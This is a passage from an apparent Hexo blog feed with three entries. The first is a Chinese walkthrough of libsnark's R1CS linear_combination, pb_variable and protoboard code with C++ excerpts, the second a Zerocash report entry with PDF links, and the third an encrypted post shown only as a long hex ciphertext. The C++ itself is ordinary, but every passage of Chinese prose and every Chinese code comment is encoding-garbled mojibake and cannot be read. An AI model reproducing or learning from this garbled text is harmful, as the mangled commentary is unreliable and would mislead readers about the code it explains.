class="built_in">vector</span>&lt;linear_term&lt;FieldT&gt; &gt; &amp;all_terms)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (all_terms.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    terms = all_terms;</span><br><span class="line">    <span class="built_in">std</span>::sort(terms.begin(), terms.end(), [](linear_term&lt;FieldT&gt; a, linear_term&lt;FieldT&gt; b) &#123; <span class="keyword">return</span> a.index &lt; b.index; &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> result_it = terms.begin();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it = ++terms.begin(); it != terms.end(); ++it)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (it-&gt;index == result_it-&gt;index)</span><br><span class="line">        &#123;</span><br><span class="line">            result_it-&gt;coeff += it-&gt;coeff;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            *(++result_it) = *it;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    terms.resize((result_it - terms.begin()) + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ„é€ å‡½æ•°ä¸­è¿˜åšäº†<code>linear_item::index</code>ï¼ˆå˜é‡æ ‡è¯†ï¼‰çš„åˆå¹¶ï¼Œè¡¨ç°ä¸ºcoeffç›¸åŠ </p><p>ä»¥åŠå…¶ä»–å‚æ•°ç±»å‹çš„æ„é€ å‡½æ•°ï¼Œæ¯”å¦‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line">linear_combination&lt;FieldT&gt;::linear_combination(<span class="keyword">const</span> FieldT &amp;field_coeff)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;add_term(linear_term&lt;FieldT&gt;(<span class="number">0</span>, field_coeff));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// r1cs.hpp L108-111ğŸ‘‡</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* <span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment">* The 0-th variable (i.e., "x_&#123;0&#125;") always represents the constant 1.</span></span><br><span class="line"><span class="comment">* Thus, the 0-th variable is not included in num_variables.</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>è‡³æ­¤æˆ‘ä»¬çŸ¥é“å¦‚ä½•å»æ„å»ºä¸€ä¸ª<code>r1cs_constraint{_system_}</code>çš„ååŠéƒ¨åˆ†</p><p><img src= "/img/loading.gif" data-src="/2021/10/17/libsnark-related/image-20211017211212901.png" alt="image-20211017211212901"></p><hr><p>ç°åœ¨å›åˆ°å‰åŠéƒ¨åˆ†ï¼š</p><p>gadgetlib1æä¾›äº†<code>pb_variable</code>ã€<code>pb_variable_array</code>ã€<code>pb_linear_combination</code>å’Œ<code>pb_linear_combination_array</code>å››ä¸ªç±»ï¼Œæ˜¯å¯¹<code>variable</code>ã€<code>linear_combination</code>çš„å°è£…</p><p><strong>libsnark/gadgetlib1/pb_variable.hpp &amp; pb_variable.tcc</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="keyword">void</span> pb_variable&lt;FieldT&gt;::allocate(protoboard&lt;FieldT&gt; &amp;pb, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;index = pb.allocate_var_index(annotation);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* allocates pb_variable&lt;FieldT&gt; array in MSB-&gt;LSB order */</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="keyword">void</span> pb_variable_array&lt;FieldT&gt;::allocate(protoboard&lt;FieldT&gt; &amp;pb, <span class="keyword">const</span> <span class="keyword">size_t</span> n, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation_prefix)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    assert(annotation_prefix != <span class="string">""</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    (*<span class="keyword">this</span>).resize(n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; n; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        (*<span class="keyword">this</span>)[i].allocate(pb, FMT(annotation_prefix, <span class="string">"_%zu"</span>, i));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯<code>pb_variable::allocate</code>ğŸ‘‰<code>protoboard::allocate_var_index</code>ï¼ˆå³åˆ†é…è¾“å…¥å˜é‡çš„ç›¸å…³éƒ¨åˆ†ï¼‰</p><p><strong>libsnark/gadgetlib1/protoboard.hpp : L34 &amp; protoboard.tcc : L37-49</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">r1cs_variable_assignment&lt;FieldT&gt; values; <span class="comment">/* values[0] will hold the value of the first allocated variable of the protoboard, *NOT* constant 1 */</span></span><br><span class="line"><span class="comment">// valueså°†å­˜å‚¨ç€r1csä¸€ç³»åˆ—å˜é‡çš„*å€¼*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> FieldT&gt;</span><br><span class="line"><span class="keyword">var_index_t</span> protoboard&lt;FieldT&gt;::allocate_var_index(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> &amp;annotation)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">    assert(annotation != <span class="string">""</span>);</span><br><span class="line">    constraint_system.variable_annotations[next_free_var] = annotation;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    libff::UNUSED(annotation);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ++constraint_system.auxiliary_input_size;</span><br><span class="line">    values.emplace_back(FieldT::zero());<span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">return</span> next_free_var++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…·ä½“çš„gadgetå®ç°ä¾‹å­å¯å‚è€ƒ</p><ul><li><a href="https://zhuanlan.zhihu.com/p/46477111" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46477111</a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzU5MzMxNTk2Nw==&amp;mid=2247486482&amp;idx=1&amp;sn=407d59e7fc47de0e929c653ce00eb260&amp;chksm=fe131d02c9649414b27a0684ce950b2a63a84ca9c901f81b7251964befd3388e0f616df5bd4b&amp;mpshare=1&amp;scene=23&amp;srcid=1017nCZqhISM0Sl0iPguEI88&amp;sharer_sharetime=1634453102359&amp;sharer_shareid=947c15bf6520d15b99a01837d68f8d7e#rd" target="_blank" rel="noopener">é›¶çŸ¥è¯†è¯æ˜ - libsnarkæºä»£ç åˆ†æ</a></li><li><a href="https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=teaching:cryptofintech:2018:tut1.pdf" target="_blank" rel="noopener">https://securitylab.disi.unitn.it/lib/exe/fetch.php?media=teaching:cryptofintech:2018:tut1.pdf</a></li></ul><p>libsnarkè¿˜ä¼šç”¨åˆ°libffï¼ˆC++ library for Finite Fields and Elliptic Curvesï¼‰ç­‰åº“ğŸ‘ˆe.g. <code>#define FMT libff::FORMAT</code>ï¼Œåœ¨æ­¤ä¸åŠ èµ˜è¿°</p>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Zerocash_Report</title>
      <link href="/2021/05/20/Zerocash-Report/"/>
      <url>/2021/05/20/Zerocash-Report/</url>
      
        <content type="html"><![CDATA[<h3 id="Report"><a href="#Report" class="headerlink" title="Report"></a>Report</h3><div class="row">    <embed src="Zerocash_Report.pdf" width="100%" height="550" type="application/pdf"></div><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="Survey-SNARKs.pdf">Survey-SNARKs.pdf</a></p><p><a href="Zerocash_ Decentralized anonymous payments from bitcoin(extended">Zerocash_ Decentralized anonymous payments from bitcoin(extended).pdf</a>.pdf)</p><p><a href="zkSNARK-explained-III.pdf">zkSNARK-explained-III.pdf</a></p><h3 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h3><p><a href="https://learnblockchain.cn/2019/05/07/qsp-qap/" target="_blank" rel="noopener">é›¶çŸ¥è¯†è¯æ˜ - ä»QSPåˆ°QAP</a></p><p>å‚è€ƒè‡ªVç¥($R1CS\Rightarrow QAP$)</p><p>â¡<a href="https://medium.com/@VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649" target="_blank" rel="noopener">https://medium.com/@VitalikButerin/quadratic-arithmetic-programs-from-zero-to-hero-f6d558cea649</a></p><p>zcashçš„å¤„ç†æ–¹å¼åˆ™æ˜¯ç›´æ¥$Circuit\Rightarrow QAP$</p><p>(äºŒè€…æœ€åçš„æ‹‰æ ¼æœ—æ—¥å¤šé¡¹å¼æ’å€¼å¤„ç†éƒ¨åˆ†ä»ä¸€è‡´)</p><p>å¯å‚è€ƒ</p><ul><li><a href="https://blog.csdn.net/weixin_43179764/article/details/102807826?spm=1001.2014.3001.5501" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43179764/article/details/102807826?spm=1001.2014.3001.5501</a></li><li>zkSNARK-explained-III.pdf (2.5. QAP construction for the circuit in section 2.2.)</li></ul>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Issue Research for Blockchain(Chaitin)</title>
      <link href="/2020/12/26/Issue-Research-for-Blockchain-Chaitin/"/>
      <url>/2020/12/26/Issue-Research-for-Blockchain-Chaitin/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Password required.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="e98eadb35e31120ad7a81def5a5ff161ccecdb52242c0745cf906d70a640df6c">5ab08714a2c6ce6a221d23e7b0eacf85644656658ec2ec7ca211478449cab1ef73702a27b916e9f4b253659eee730a9cf3f78bf0d0405a7b40f35a0f3aa4353fe73ffc7872761c2ad0d770884d2b918cf0b9578e8a3565be471d5e9aa3036a5be87c08c50917db2f775b0df92d8ef589e5d5ede9d6804abd80925ddf66d37967ad5c99c0f0510d6bbf5fbab30017ca0dd6a641d263e2dff1d6675a480e7509cde4afca9259ffddecc98732b3d9ac101a91b84e53171db639134982351a2a201c0c9221e363c0339df1a03f720c9d0a3b5276d38f7430fec192ec6524331d27c3797f91c06e9d05a98f68bdd0466cbe5e1b6e9130901701017df972c80121bb5156a75c35032feb37e6168375a94b6b50237812ff00d03beb1e603b264d545c1b3045da054b99db477aac6dfdac551de82e02c66a1c75d1ef70fce16cd4c85b7ec0fbe740b2fb071dc327d3a6e16000295af0d750bfe77b4810963cffd299455b7de9c2985aa698171ebc26ceb51b9d666144594edfa56e182f7ac8bdfe95ce8c7078167f3b349076c9a83379a4288b4bd3af423e20f0a0011498594c712c723210170cc4ab3a241277bf0e8c8cdf663acb738c11bef0852925ab4587ab0a300e225e9da3bfc5a0fd2581d35310deb6be94537fc0afcabe02b1cc512c9e5a66797b5c7efcbf8df4e4ef8a3f16845536ff5dd2c6c358d489e00c3392a4cd923ddbb3db28681e5e9bb8a134f7ab92fd13db62839f2450519ce60aa3276e8f5989cb7af59745ad9116524708f4888d9e14e8cf40139beaf1c695b15cfd1794f29640ada5f28a5a067f97e2b9ba60aac6d0a1da9d746b9c6b355d3efdb7be0a6512f461b7ac8acb1398a8b20656a4e504ef686681c89af8d5edc3ad4b7f6e51c320616df793cba768040b6a42847b4bfa6fe047284c24034bda9accea441283ee0ca58244d19c4f7a397a6dceb49de33c0455d2e5a30d58106a129b4036844b118d79a46ca5fa9e546401f7970768c18734e1d870d86e6566d3969005a5757f8c26543b324bf3ddf24d37c4230c81d4829e1146685b9576bc195ce553108b7e64575e308e05174f10efde4c8f41ca2a0e559b2a043987d37b04eed85bbf318cd309f1dbbb6b8f583b42e9f7a62f5ce0563dbcf590c5135ba9d0aa24c50f12656ffe0716417d21c5043639b8b43ae30a010b24ef747ea26170236286c186a4951f27c968e787400bbbbd162d06448576701f46af6f91d491b450a6b6c0289dad1f9e97843aa5c45fcd702d0cc7dd841c9ba4940776e39e4b3d4af8a772a8bbfd0dca126c08143311e4ce37280effaa78a69c39697ac6e7e895cb08816659805955765b985c63a95fdb10bde00e1505a57ebe989d1a5398e007dc0cf1b0e720af3864caf748e15d5a4e46a78037a6d3c131105732bd2189071264aa9367f2870198f8cc77ce0b86ffd754f860f962d8c34327c454151b2cf41e80453dd5851d43a91da0f1171c8bb80f65d95728cc15b394747f455a78df1ab728af0c5de3d50a3d3bbf16d16ff9daa89c7d249a2a6c8be6b74f8a18a3c37d3e1bde1a3c847b9f3f4e052eff4cba4497adf00cf92176b6c3a193bf83872815dd2b8e9ea7eba4e65a70e122a66eccfd8e0e04f7faf7e2817727fe31696a0c73d3deb2104f88f6f86141ca41eb73f5f2bbebe6f8c11f6c14441f9f145adce3fe775d20cd3228a51387c7d92d498be2e9f3459c530d4aeb38d8fb23936d49249b7bdcf297caa509ec2e5ff4dc673cafdd1a9e8a4b4de5c5fd858cdda61503d9d137afa94412a2e7178dea328531fc33ed4017a93cd55e033baff5590ea1661a0d31f4eae63c234c9669c61371e4d5938409a7b1b198eeb7a4a88f8938c055ce0741e0470479d5d0c65601dd5d7437f15d9d03bfb2925861a9b7e8ae82c5f675812d247adcf6c484dc3725b88c86fa29faa4c03f07ee9c8fccbca6248a751f8675ce225fcae015f71165f56e069bcd76feeba8e43a34ae920d349ef7287cac14a8799e2bad31d29b024cc0bcddc20fe6ab5d711354cf0142a89e2f4cdcf565599f42aec83904e97881b5ad16cf3be700e0e69657cdfd0a466c2bfc826e6a75ab2f0aa3e469c52249e6537217700f2b6d990ecda563b2f1b76f95bfbd7d8461272e037aeadb2de13db1904b3374ccc36536b3f81673d5c1acfbf1b26c1e4f1bb52a96ee178eab28a64a74c23c3f2e1f53c022bdf5749b0bc61981ff0f8c82b20f3e0beab101230f2fe53a2606f600d4256dafa5ad84f7153c70023afae4e8d6794b6aaed4fe828ba14d906442251cc60c1318310424d9bf38e4bc61f09a0a86941688e12ea656e70479035904c2768dedb60cdd967266a087af47c612c77749fa4a5d98972e16eb91c62fa0e5eb339bc74378e2e1c19b17b5252c2b446340c4ee9bb7dea579c91fdd24dd63f30fe07a393da536d9f722c2016e125a924b35e0a2d0147626907cd1dd05b9918c8c38657a89d57c4a3b73249daf86faf3c8d32f3298293a63d65fd0e66d4c3202a5d061816f1fb2b7931cb7e0f6bff5d2f193f9c59a6852813c1c6250fe32612ab5c88026bd7083e111c1f511717eb585921308bf3c0a1d3c31da3aefad3c573d3d19852a966eded0ad9de102a48973310e26db2695cdf06558ee78b6e0f9674388956e9890f533b1991725539197a1dfc693e100b419c7354661b05efb3e7a4debc1b7aafe198e905a43e92dbeb0011d218b4523d1067342d0eae22fc556e1a7fc1d53c06b87d84f9abbdca858cdc04aea528aa46663d61af29cf16bb1d645621b6abb752b9bcb9c4ce7b49d2a96555eba6d85cf701b082ce305967e6a3c9684dc7852ba10cdb0daca39c4255a6c7ee4d9762906e2852830aed39c7875d108e450f1251bdbdb3ded86b6d3c5f9a51e31c3594bb137d113541e7efd3e04c55d6ff6a538c69326713b89bbda7a6a00f2c89f50fb136fec6a4f5af410d55037d067d2d33344bd3ccc246356b51ac2735646aeb655b775db7318d6c21812709d82879237c8d966031ca20d15bdda3c95ea9b272c9027931b4cad2f2e15552f78321b371a80884b8501f29bcc464b49afeebb2b9ec5aeec88256e28770bba54da3b185462979bf64b6fa431674cabe96cfa90832808d722f3e44927f1e7f1436106a07a619b58e61f285829b8726bc14e7d61543a185ee4baf2221d5297d4661478e6397885eebbb31937b25d78e952e9a9fb932e2546f0aa3c07552a52d732a5e6c20e1161d7ec607bee3101d5e81809c7dced5058182a325bd6e654bae5de71332526f0bf343fe75a657a54d9bf6757ee5542c03dff413d86948535fa376689b8ab0468d75408b3a99f31cd4fdd465d503cbfb2ff4fe00a8dbc8bb9bc7128ee8fd65f1624f14d6f983d07590b2f512722f9313679b584b404fdf0c019fa4771ba7081a5d4e985cd0d51e5c4ab01d3d8c1e88052186142c37b7b986a61cab7138a85396cf7068cb550385fb0f4cfa2bf69c2c33791344151a2ec5b0839dd82a3472c245f4450dd124a6bfd0751f67428eb230f0a0ae7a843c5f71accf2c52bdf25192fdd7ce3a325f486a9ada01be82c93d79e917295e65211e000706b7984a77ecac4e9549a2f043fb9322de9ee0000cacd60f5522be4e1cb5aa12190166f0ef96a460841196ae7bb6ba909ec50ca2c0c8df03b77d78db7ace173b3102f8ab2eb1ea6138c1df4c5fd1d48941dea23a8f1f92c1535c12b4d27d5978fe69ed431b69e540919c172d1300827d8c22ea41bded4a44204ebb7d5b9ce3a92522adbcce9b4add1f230cec8c4b13af01f4222741ff1558f264686c75621a192eb4f659b7e585bb58858691d70d2e6fd50df850695176f8c386a8ef3a74a55054a1b179b3cc68d2e05e60e838f26888f965438f0a36fa05059718faced218ffa98d5a605ed52619da6748740ea8673b45a69512a4ddc321c7ff56c74733f442abf5da85ca99f3aed81dce0fc8595f1b3dbde86fd95ff6ed25bd7df57d57ce01f63916d1848180b950fe34d0a401213a6c6e09a5364fc59811ecdfd73571e00e10f9508d70a0b390cf4b975f5083fd55c039c2bafcfae1e6150c4a87a706378e212185c03dc5a6006c343d06198abf6b11105de3b7b3e18c19ca7c3b7acc7266697c72cb147817431e11ea9b7b08d78fe9fbe6c175198ecaf458f9ca633bea926b20451f358af906822646ff6512755d731b9e79840f8d2cb8be5e2f81d25f1f2d89764478beda5a21d6f75d93de4e1cd0f8d5376c0b4ba2b953c2820b0c32bf1b1ae15973d082fab95ba476edf9a4215df52a3f481d41f623d3fbe0656b162a44abc17b11e1d1822d570b87b24622a872eb9cf0c701bfdd9791adeaff92f1bf1ed3ee40caddc32d57f6ed7d2992118fba8d42c05407f3ffd322b4bc164f6a803fb730d5ea966a4936fe444a80e4a08a2084b8cce2a967198d8e5dd98034b7cd0f8d5bb6274711092c34bcbac1c236043f2344cb1e22a8c903eeae4214ecfbdc35a83bef838a7057d1488c8466da3bd0c1abdf92f0ff903bb3086c4e66e32a29657ebdc8380c5523569f904e84b7bd9dd065998b6719c097b93e6e4fff2fc0f551649f181e252ab356e38e9fc168b56a5f2fda2d9f7d56666b270f92e95687adb03984fa80c1b5d3f969a2366094b74132c11e6952274a12f075c08e0d209b7f6594061a650a9341ad6e2edf5ebe8d0e4f965e8a0daeec71a81227e679d3ea631ccbb08f314db560d7e8543f8be34e3555ecb7c39decf87f45c47c260fe8613a4337b594a93ac43aa259f52c9a798ba5d086868f3e4df11fff89c60f847efee4f80ef280b1851ea7163419e13a6b6732d457c0898d5ac111ee1a438c538f72f0224218edad979bc7a4aeaec02dd5470464442e34dcaa38341ddc0e3a9ae8089e093a8d64539566eaf25378bb26347bfac6c3af8ab8f62c4c9805b53ab2aeb324b0883f1b3b5f326db568c60c0c6e680d04c4ac1893c0c5a0746d1f5ad589b81c1ab1308d5166d258db88761557990f56dd8f4239e38b20167b5c45a0ea6cce1c04f28db12ba6b88a9ac16ee77d7632e716458ae27c2e444238b60122796da9a9eaff5d05ee3db6e2468d639cc8e13ade2158cf141f1b8a246e30a07e30147943d822734f7fff139f9df2fd02d0b95de373f8a85944f077ae5328bfc5d7b357eed1eb9f41a0fa435cf343aef1b03ed9ea6c2caf123b7cd845cf344b61266e909d2da3b8d790a27588f235fb875188425cb8c8b1a1d15a706f7ddfa12e2a0f4195c14cdb7adcd04b4a5583a88c1d30a6aac0c90c58f0378ed3f0e0332e062d84ba58dd6eb679b7b11d8fb4786f301e76eaa0c7eda89da0f1c8ee5f4596c3e8b61b24198f661f23661dd8b42e735776c3c744284c7ce4e685267256643cc347b9f59a5ef58b3da7d7161cf08f365ef8ea957fa4e0f0b65bb9fc14cced181e6be6605aa4e339c8757fa6a684d20bebf18fabe3053515a174e1f2e53aa46f5da9d44aba87e85a9709d2d2b5c148a4e399ee83a83bd017f6c8226c2d7d09e14a368c7265554e9a36fafeca7cd692da38dda4b7a9229ee49cbb6edc97fbc7da3c904f8a9ee085bbcf2cdbfa0fc4a80a0da60303441761be8b5d25190a39756ce3eb3585bd8c3c92b091b94fecb310087b6b175abe3b0c3ca51fea9b71c0ba1eb95587748c625f31a32d812ae66bbbc99dd8614704adb0b7d24d1c73c107bdb09b117916333b50366591d93fdd24fb63cc37c0c7ad4be7807f4ad52c3861ec1ab5fc57010114a93e0feadca406c1bf8cee80c368d40cc5ed9c280f6ac22a95875e008fbc4bc3adf866df5cbab977d9dcf72be3bb2d9a6905ea771fab9b7d942c951fe6eb0c9f3c37d91684dfeb5a77f8d86f4f1cc9892458ae8fa1fb58a0f203e023f068346e20a5143b9ffbb636c84c215118e588b840f91adcf03890e6aad556d819a58cacebd7aabd6ec0afcd2bf9bbb0a54bea752015258c60ffaa40f2bf2e7498426e6fb607c73e7c6f91d39c28811c298c7c8b8d10f227e823f60142c7519e31a21b76d127d03b0e60309e43c6b929b1fac202a575c337dac5294140ee1131b5c265e48e773b37d5872b99d958e142a988911a4789a95ccd4fccee1125f5d25c199591277ff77a178689a4318f8f4184574189c176ce49e68f057cd0d8b803b7e087b34260da3f82b551e0fbbfb2678a72be7ace71e12c73a0313dea75846dcaf37391ed8c0266997f4b4e0a76989a4feb9c85199411025a0085e0b75e19ffd8ffe56b40f8bc0c19d3ec89b8dd1267706e1b0a2b7513b5e8f0862c20cf84e04be061ec98d0d9c603a96b461acdd7a87d1330855d3e3f67fcbc879f04ff338ba5404d2412c7d751c34f0d88179372e41ecf125d0f064568c5945397198f79ade642ae0a668077dcb88dc4cf88387b83f595479830dc03d60e9daeb2f97281d2a8ece298b0f87afeacbefe276666e4c97c834724a6cf9934c0a9c687bdc4399a9235db23a17db17896968882a3d3a9438f9f42e7521a06450028380f52d9c8a991cab0c76fabfb95d6cebc84ed2762b13cda0c85d27cf2a706492dd4680a9b1d574cc8fe114164ba15737047b0671933f705b2a066f374b387d7594ea66986db1fa9a4113f7b6f4a1bb5385f7b322754152a6b42c92a81184daaf4e1f01583c55d6e2d9570c83a76012de0bc04c75e50fe94d68d4c719788271ad1ef2e4bfb23e5b2dd5de3451c9055be3beb9bb634d68c1a244d8d8d30f3cef97fb90b0adc0b2f57f6bfe4298710fb30a439d2759deedc7ace2d258de4af5a049713a8c50ddd4591560fef53f21143a6d385dbda6f9940603a53160eabefa7f0f540d0c04754a2edc6339abe9c98a13db6a686ae1c314e513805aa6cb5fdf3067f8f9dae88c7a5894ba7f74aa06cc0aca6c35bf51b0246caf6bcd3ce883b8ca72e58e1da49e58b64fe9e22a2ec5bf73b4a5f2d4cf85af0f7a37288202bd0de0c729de74bac247aff293f9551b50a94f153f4558a8b1f1e0966fd0a6d842b17ac813c15b565979226344405c57028be741841e67cb4f630162061a0e96feedb0114b14c6a0fe134de0fa97a97a7fe63423b0dcc266b094d9d059925ece9353cb1d2c6b2cde32d64dac9d2dd92cb5b78de5e12e9f0aaa470e6c43ee4d53f847a6cdc74a0a921c48e2db8d89afded5a835f479cdf4ea30705c4936a56d869f28445e7ddede239ad837776ff9535ad2a76bc1140082df6f5f6d0eab9cdde812fc26a2839a44d716c9a1f7258388bfffc1fb038cc30909c0093ad2728aa4d0e71c1f01ed2388ed4401489bc3118fd8300e729320c451b8678118aee888319b6e14236e1e5b17e8f62cb8e98d387edbbad63372f0bffb8dd8810bcc6bc21bfb27c4ec833e1994d5260c4661d3e70450e80665a2cf6bcdaa0199789f4fdc4696e36b7b04255b9c8ef25cea036424446768b1db35f00cc54bf459c8ea9df7bd8dd6d8253fc3390295a38b1b0dae6f5adcd3f293a13b8674e0b052792218638e37a4ab9229cb28fcf32d5f90a27e411565c67b083baa07262999492c7ab04a80446b6bd4d0a91daf308f5679284e382ddcf357e090de5455a792d2fbe59c1e8e44756d9424410cc83c9874b22e087ed086022f749c5273d6909be52249feaa50a91a59fdaf17b62606f22eee892bba622aadfd3cb844432292327e40b287c567da435f56bff5453df0557f7d6cbfd947bfad9f216aa461690dc1915689e088072d6fa3df794cac0e1055decc44f3f7c3356418f20f22daf9060c66bb4b96122431ccee7ef7d4fcccbe26464c8f8a1f8560daa0b8fa68e47c3a8c64fefcfd5fa030b9031ff3f1c0354b16a76e86ef30eae4f5c00761afb48c526dde232e9ad94277dcc4b16a7f289941ab1b24dcd5edadd74f07e6a6af404e8392b0f860dae5aca92e42e1b90f63406087c86eb6b6d4ce7fbb0bd5262850be48306cbf06e81e1fbc73c942a02fb2a2c93bf9a5b155534a0ada440c93757d925708e5bdc9aaa2515fd9dbfc05f52cb492312885ed1932d3f6f4655107538539e735244ca9a281ac9620768372e33fb9c7bf973c7f2c9835cc18eb8dacd6b8ac4d61f7eb3630f62aa8be61d3a9049bdc85a98aeb949eb4e4447bc0bf37588f9254a1e4a9853273074a58800704846d2093021ff420d720135fe65cea8f3cf7b29d9af66630337102f7d8ae14d4dcdc9e4051f4c99678530f2264b56e8935909df00aaff8fb7a65668667e8f1d4a8754cc746c2012010f607ae811c8ecb749d0e03a7f8e0069b8116df160963c94bb9b268ca4f641eb3bf91b770539db8d4fd540537f273945ce91a4e79fbd80205a719e2c78baf2c6a1a00a8bc9aa3ae97aa5fdd51e0ba5c02e7b0ef069c6d554c676e74d85e6a87f3a3259fc66d3a69d3cc36d55658913a2f7ae27ff891fd3e1700964769a0b8c911f51775dff7eeb9743b6c55db1d43f50c08dea28b23e87bc2fcc358e70eddcad8a41683473cbcecad56e008db260857d512d1ff30604b7db1aa5123c44b6773ba9544ea12251176746214196999589263450a519a9b401b43afdbdc0b322ee0fc90c3d92198d6c87525b59426cabb06a7f6394335c20697c4a0b80964922ce2d6e292f00d427e2b714a96c781fce84f22360014d7079f457fa5916968c24093aafb38de7f0e016d066d58f0c8d73f2e432944ef543f2a543786654cb8b33e90a4bbebd6be6ca7698c64fb49fdc146cdbe79d9036990cf5e2525c81c242940d71846c0f1a2364e564771950efd83b0c610177cdf174b6242af52046f70beac5733c1369fe698c3aea0fd70aaf8243f4a77610076b977bd7cf96e3890a2f517b15ffc47cb3f1d77d9632fdffa8455a73e4b19c28984682ab3dbc275560b6b7a84cb818d5f29e687be758dcd9e6216d3dc074046565afaf3a987a26edde8d9cd77efd8f20964d399e136483361150f134b2d3d345c259896655c3eae7f6ee4ef4b53690e0ffaeea5bdbf026c9ac34c2afaed5a687dc34e0268ed67c7778d2443ccb1bc366eafad3fbb27e53abff9c614d4b99e123a9fad5a9fa382fb77798674aae8195bf463a333fcfbbf293be1a2a5ea32db4de5acf715efecd2a350822e184527bd6c78ea008d73e1a20628065ebfe0d0f161fa5906786d129c3888bb95ce1a38bc90879582c9c42cc60091cc2057689bfb901aa8028b27ccf2b80472ffd78226af548ab8659be97fd95679d2485d0ae8fba3e9b8d55fc215db68d103b102172b13528ae8bd2028583c7ba0efe9b422a4cb8cb88ff972d5bb968242d94ec08184fc52108f67847e0fff5aca15e1a3fa619dbcbbcf7212f9f1792b9e0cbf435b24721a8dfe7b8632835337e0f13741c90424987e0d8f8a1047ac55489aa2ad060946a399c72f51e5b37fc28e09fa902dda7e3fab899a589473a95ab081590935b05628849ebe80496ea43d54bd6a82845edc616023d2705e7c13aa7eab4854807f8794a580d333a1ca6ec0128a540b628b5acb0769b50d43965aff82c37d7295d64403b7bdfd9c3bdabf6a4e5af30d